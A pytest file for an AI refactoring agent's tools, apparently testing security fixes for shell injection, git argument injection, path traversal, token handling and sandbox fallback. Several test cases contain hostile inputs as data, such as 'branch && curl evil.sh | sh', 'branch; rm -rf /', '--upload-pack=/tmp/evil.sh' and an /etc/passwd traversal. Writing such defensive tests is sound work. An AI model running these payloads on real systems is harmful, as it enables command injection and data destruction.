"""Tests for the Codebase Refactor Agent tools, including regression tests
for the security fixes (shell injection, sandboxing opt-out behavior,
token handling, branch/path validation)."""

import base64
import subprocess
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
import tempfile
import os


class TestFileTools:
    """Tests for file operation tools."""

    def test_read_file_success(self):
        from src.tools import read_file

        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("Hello, World!")
            temp_path = f.name

        try:
            result = read_file(temp_path)
            assert result.success is True
            assert result.output == "Hello, World!"
            assert result.error is None
        finally:
            os.unlink(temp_path)

    def test_read_file_not_found(self):
        from src.tools import read_file

        result = read_file("/nonexistent/path/file.txt")
        assert result.success is False
        assert "File not found" in result.error

    def test_write_file_success(self):
        from src.tools import write_file

        with tempfile.TemporaryDirectory() as temp_dir:
            file_path = os.path.join(temp_dir, "test.txt")
            result = write_file(file_path, "Test content")

            assert result.success is True
            assert Path(file_path).exists()
            assert Path(file_path).read_text() == "Test content"

    def test_write_file_creates_directories(self):
        from src.tools import write_file

        with tempfile.TemporaryDirectory() as temp_dir:
            file_path = os.path.join(temp_dir, "nested", "dir", "test.txt")
            result = write_file(file_path, "Test content")

            assert result.success is True
            assert Path(file_path).exists()


class TestRunCommand:
    """Tests for command execution - now list-form / shell=False only."""

    def test_run_command_success(self):
        from src.tools import run_command

        result = run_command(["echo", "Hello"])
        assert result.success is True
        assert "Hello" in result.output

    def test_run_command_failure(self):
        from src.tools import run_command

        result = run_command(["python3", "-c", "import sys; sys.exit(1)"])
        assert result.success is False
        assert result.error is not None

    def test_run_command_rejects_string(self):
        """A raw string should not silently be treated as a single argv[0]."""
        from src.tools import run_command

        result = run_command("echo hello")  # str, not list
        assert result.success is False
        assert "list" in result.error

    def test_run_command_never_invokes_a_shell(self):
        """The core regression test for the shell-injection fix: shell
        metacharacters in an argument must be treated as literal text,
        never interpreted by a shell."""
        from src.tools import run_command

        with tempfile.TemporaryDirectory() as temp_dir:
            sentinel = Path(temp_dir) / "pwned"
            malicious_arg = f"; touch {sentinel} #"

            result = run_command(["echo", malicious_arg])

            assert result.success is True
            # The malicious payload should appear verbatim in the output...
            assert malicious_arg in result.output
            # ...and must NOT have been executed as a shell command.
            assert not sentinel.exists()

    def test_run_command_uses_shell_false(self):
        """Confirm at the subprocess layer that shell is never enabled."""
        from src.tools import run_command

        with patch("src.tools.file_tools.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            run_command(["echo", "hi"])
            _, kwargs = mock_run.call_args
            assert kwargs.get("shell", False) is False


class TestValidation:
    """Tests for the new branch-name and path-traversal guards."""

    def test_valid_branch_names_accepted(self):
        from src.tools import is_valid_branch_name

        for name in ["refactor/add-types", "feature_x", "v1.2.3-fix"]:
            assert is_valid_branch_name(name) is True

    def test_branch_names_starting_with_dash_rejected(self):
        """Guards against argument injection, e.g. a branch name that would
        be parsed as a git flag rather than a ref name."""
        from src.tools import is_valid_branch_name

        assert is_valid_branch_name("--upload-pack=/tmp/evil.sh") is False
        assert is_valid_branch_name("-x") is False

    def test_branch_names_with_shell_metacharacters_rejected(self):
        from src.tools import is_valid_branch_name

        for name in ["branch; rm -rf /", "branch && curl evil.sh | sh", "branch$(whoami)", "a b"]:
            assert is_valid_branch_name(name) is False

    def test_branch_names_with_path_tricks_rejected(self):
        from src.tools import is_valid_branch_name

        for name in ["a..b", "a/", "a//b", "a.lock", ""]:
            assert is_valid_branch_name(name) is False

    def test_create_git_branch_refuses_unsafe_name(self):
        from src.tools import create_git_branch

        with tempfile.TemporaryDirectory() as temp_dir:
            result = create_git_branch("--upload-pack=/tmp/evil.sh", temp_dir)
            assert result.success is False
            assert "unsafe" in result.error.lower()

    def test_is_safe_relpath_inside_base(self):
        from src.tools import is_safe_relpath

        with tempfile.TemporaryDirectory() as temp_dir:
            inside = os.path.join(temp_dir, "src", "main.py")
            assert is_safe_relpath(temp_dir, inside) is True

    def test_is_safe_relpath_rejects_traversal(self):
        from src.tools import is_safe_relpath

        with tempfile.TemporaryDirectory() as temp_dir:
            outside = os.path.join(temp_dir, "..", "..", "etc", "passwd")
            assert is_safe_relpath(temp_dir, outside) is False
            assert is_safe_relpath(temp_dir, "/etc/passwd") is False


class TestRedaction:
    def test_redact_secrets(self):
        from src.tools import redact_secrets

        text = "clone failed: https://ghp_supersecrettoken@github.com/x/y.git"
        redacted = redact_secrets(text, ["ghp_supersecrettoken"])
        assert "ghp_supersecrettoken" not in redacted
        assert "REDACTED" in redacted

    def test_redact_secrets_handles_empty(self):
        from src.tools import redact_secrets

        assert redact_secrets("", ["x"]) == ""
        assert redact_secrets("hello", []) == "hello"


class TestGitAuth:
    """Tests for the token-handling fix: no token in argv or persisted URL."""

    def test_build_https_auth_keeps_token_out_of_args(self):
        from src.tools.git_auth import build_https_auth

        token = "ghp_supersecrettoken"
        extra_args, extra_env = build_https_auth(token)

        # The token must not appear anywhere in the argv list...
        assert not any(token in arg for arg in extra_args)
        # ...it should only live in the env dict, base64-encoded inside a header.
        joined_env_values = " ".join(extra_env.values())
        assert token not in joined_env_values  # raw token shouldn't appear...
        decoded = base64.b64encode(f"x-access-token:{token}".encode()).decode()
        assert decoded in joined_env_values  # ...only its basic-auth encoding should

    def test_plain_https_url_has_no_credentials(self):
        from src.tools.git_auth import plain_https_url

        url = plain_https_url("owner", "repo")
        assert url == "https://github.com/owner/repo.git"
        assert "@" not in url

    def test_clone_repository_never_puts_token_in_argv(self):
        """Regression test for the exact vulnerability described: token
        embedded in the clone URL, visible via process listing."""
        from src.tools import github_tools

        with patch("src.tools.github_tools.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
            github_tools.clone_repository(
                "https://github.com/owner/repo", "/tmp/dest", token="ghp_supersecrettoken"
            )

            args, kwargs = mock_run.call_args
            argv = args[0]
            assert not any("ghp_supersecrettoken" in str(a) for a in argv)

            # The raw token must not appear in ANY env value either - only
            # its base64-encoded Basic-Auth form, in a dedicated header var.
            env = kwargs.get("env") or {}
            assert all("ghp_supersecrettoken" not in v for v in env.values())
            encoded = base64.b64encode(b"x-access-token:ghp_supersecrettoken").decode()
            assert any(encoded in v for v in env.values())


class TestSandbox:
    def test_is_docker_available_handles_missing_binary(self):
        from src.tools import is_docker_available

        with patch("src.tools.sandbox.shutil.which", return_value=None):
            assert is_docker_available() is False

    def test_run_in_sandbox_raises_when_docker_unavailable(self):
        from src.tools.sandbox import run_in_sandbox, SandboxUnavailableError

        with patch("src.tools.sandbox.is_docker_available", return_value=False):
            with pytest.raises(SandboxUnavailableError):
                run_in_sandbox(["echo", "hi"], "/tmp")

    def test_run_linter_does_not_silently_fall_back_to_host(self):
        """If sandboxing is requested but Docker is unavailable, run_linter
        must fail loudly rather than quietly running on the host."""
        from src.tools import run_linter

        with tempfile.TemporaryDirectory() as temp_dir:
            f = Path(temp_dir) / "a.py"
            f.write_text("x = 1\n")

            with patch("src.tools.sandbox.is_docker_available", return_value=False):
                result = run_linter(str(f), "ruff", repo_root=temp_dir, use_sandbox=True)
                assert result.success is False
                assert "docker" in result.error.lower() or "Docker" in result.error

    def test_run_linter_explicit_opt_out_runs_on_host(self):
        """use_sandbox=False is an explicit, caller-acknowledged opt-out."""
        from src.tools import run_linter

        with tempfile.TemporaryDirectory() as temp_dir:
            f = Path(temp_dir) / "a.py"
            f.write_text("x = 1\n")

            with patch("src.tools.file_tools.run_command") as mock_run:
                mock_run.return_value = MagicMock(success=True, output="", error=None)
                run_linter(str(f), "ruff", repo_root=temp_dir, use_sandbox=False)
                assert mock_run.called


class TestFindPythonFiles:
    def test_find_python_files(self):
        from src.tools import find_python_files

        with tempfile.TemporaryDirectory() as temp_dir:
            Path(temp_dir, "file1.py").touch()
            Path(temp_dir, "file2.py").touch()
            Path(temp_dir, "not_python.txt").touch()
            pycache_dir = Path(temp_dir, "__pycache__")
            pycache_dir.mkdir()
            (pycache_dir / "cached.py").touch()

            files = find_python_files(temp_dir)

            assert len(files) == 2
            assert all(f.endswith('.py') for f in files)
            assert not any('__pycache__' in f for f in files)


class TestGitHubURLParsing:
    def test_parse_https_url(self):
        from src.tools import parse_github_url

        info = parse_github_url("https://github.com/owner/repo")
        assert info.owner == "owner"
        assert info.repo_name == "repo"
        assert info.full_name == "owner/repo"

    def test_parse_https_url_with_git_extension(self):
        from src.tools import parse_github_url

        info = parse_github_url("https://github.com/owner/repo.git")
        assert info.owner == "owner"
        assert info.repo_name == "repo"

    def test_parse_ssh_url(self):
        from src.tools import parse_github_url

        info = parse_github_url("git@github.com:owner/repo.git")
        assert info.owner == "owner"
        assert info.repo_name == "repo"

    def test_parse_invalid_url(self):
        from src.tools import parse_github_url

        with pytest.raises(ValueError):
            parse_github_url("https://gitlab.com/owner/repo")


class TestCleanupRepository:
    def test_cleanup_removes_directory(self):
        from src.tools import cleanup_repository

        with tempfile.TemporaryDirectory() as parent:
            target = Path(parent) / "cloned-repo"
            target.mkdir()
            (target / "file.txt").write_text("x")

            ok, _ = cleanup_repository(str(target))
            assert ok is True
            assert not target.exists()

    def test_cleanup_refuses_suspicious_paths(self):
        from src.tools import cleanup_repository

        ok, msg = cleanup_repository("/")
        assert ok is False


class TestSyntaxValidationHelpers:
    """Tests for the executor's new pre-write validation (prevents writing
    a broken/corrupted file when the model's output isn't usable)."""

    def test_extract_code_from_fenced_response(self):
        from src.nodes.workflow import _extract_code

        response = "Here's the refactored code:\n```python\ndef f():\n    return 1\n```\nLet me know if you need anything else."
        code = _extract_code(response)
        assert code == "def f():\n    return 1"

    def test_extract_code_from_plain_response(self):
        from src.nodes.workflow import _extract_code

        response = "def f():\n    return 1"
        assert _extract_code(response) == response

    def test_extract_code_returns_none_for_empty(self):
        from src.nodes.workflow import _extract_code

        assert _extract_code("") is None
        assert _extract_code("   ") is None

    def test_validate_python_syntax_accepts_valid_code(self):
        from src.nodes.workflow import _validate_python_syntax

        assert _validate_python_syntax("def f():\n    return 1\n") is None

    def test_validate_python_syntax_rejects_invalid_code(self):
        from src.nodes.workflow import _validate_python_syntax

        error = _validate_python_syntax("def f(:\n    return 1\n")
        assert error is not None
        assert "SyntaxError" in error


class TestAgentState:
    def test_agent_state_creation(self):
        from src.state import AgentState, TaskStatus

        state = AgentState(
            repo_url="https://github.com/test/repo",
            task_description="Add type hints",
            branch_name="refactor/type-hints"
        )

        assert state.repo_url == "https://github.com/test/repo"
        assert state.task_description == "Add type hints"
        assert state.overall_status == TaskStatus.PENDING
        assert state.plan == []
        assert state.sandbox_enabled is True

    def test_refactoring_step_creation(self):
        from src.state import RefactoringStep, TaskStatus

        step = RefactoringStep(
            step_id=1,
            description="Add type hints to main.py",
            file_path="src/main.py",
            action="add_type_hints"
        )

        assert step.step_id == 1
        assert step.status == TaskStatus.PENDING
        assert step.retry_count == 0


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
